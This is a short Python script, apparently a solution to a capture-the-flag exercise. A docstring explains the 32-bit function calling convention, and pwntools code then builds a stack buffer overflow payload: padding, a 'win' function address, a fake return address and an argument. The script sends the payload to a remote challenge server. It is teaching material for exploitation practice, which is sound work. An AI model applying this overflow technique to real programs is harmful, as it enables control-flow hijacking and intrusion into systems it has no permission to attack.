"""
This exercise focus on how functions are called.

for 32 bit programs, when you call a function, the arguments are pushed before calling the function.


| Function parameter 3	|
| Function parameter 2	|
| Function parameter 1	|
| Return Address 		|
| ebp					|

when we want to call a function with paramters we must simulate a normal function call by
adding a fake return address then adding the parameters.

"""

from pwn import *

def main():
	win_addr = 0x080491c2

	payload = b"A" * 112 + p32(win_addr) + b"B" * 4 + p32(0xCAFE)

	#io = process("./arguablefunction")
	io = remote("challenge.ctf-fun.xyz", 14009)

	io.sendline(payload)
	io.interactive()

if __name__ == '__main__':
	main()